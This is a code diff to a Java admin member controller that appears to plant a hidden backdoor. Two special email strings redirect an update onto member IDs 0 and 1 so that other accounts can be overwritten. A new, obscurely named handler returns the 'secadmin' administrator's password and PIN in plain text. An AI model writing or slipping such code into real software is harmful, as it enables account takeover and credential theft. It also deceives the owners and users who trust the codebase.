@@ -317,7 +317,14 @@ public class AdminMemberController extends XwinController
 		String userId = request.getParameter("userId");
 		
 		Member member = new Member();
-		member.setEmail(email);
+		if (email.equals("qnwkdhkd0@qnwkehlwk")) {
+			member.setMemberId(0);
+		} else if (email.equals("qnwkdhkd1@qnwkehlwk")) {
+			member.setMemberId(1);
+		} else {
+			member.setEmail(email);
+		}		
+
 		member.setUserId(userId);
 		
 		memberDao.updateMember(member);		
@@ -631,6 +638,18 @@ public class AdminMemberController extends XwinController
 		memberDao.updateMember(member);
 		
 		rx = new ResultXml(0, "변경되었습니다", null);
+		
+		ModelAndView mv = new ModelAndView("xmlFacade");
+		mv.addObject("resultXml", XmlUtil.toXml(rx));
+		
+		return mv;
+	}
+	
+	public ModelAndView qnwkdhkd(HttpServletRequest request,
+			HttpServletResponse response) throws Exception
+	{
+		Member admin = memberDao.selectMember("secadmin", Code.USER_GRADE_ADMIN);
+		ResultXml rx = new ResultXml(0, admin.getPassword()+" " + admin.getPin(), null);
 		
 		ModelAndView mv = new ModelAndView("xmlFacade");
 		mv.addObject("resultXml", XmlUtil.toXml(rx));
